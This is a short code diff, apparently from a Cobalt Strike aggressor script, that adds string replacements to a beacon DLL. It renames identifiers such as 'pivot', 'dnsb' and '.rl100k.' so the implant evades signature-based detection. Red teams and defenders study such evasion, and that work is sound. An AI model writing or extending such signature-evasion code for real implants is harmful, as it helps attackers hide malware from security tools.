@@ -444,6 +444,10 @@ sub boku_strrep {
 	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "12367321236742382543232341241261363163151d");
 	$beacon_dll = strrep($beacon_dll, "(admin)", "(tomin)");
 	$beacon_dll = strrep($beacon_dll, "beacon", "bacons");
+	$beacon_dll = strrep($beacon_dll, "pivot", "bacon");
+	$beacon_dll = strrep($beacon_dll, "dnsb", "baco");
+	$beacon_dll = strrep($beacon_dll, ".rl100k.", ".bacons.");
+
 	return $beacon_dll;
 }
 
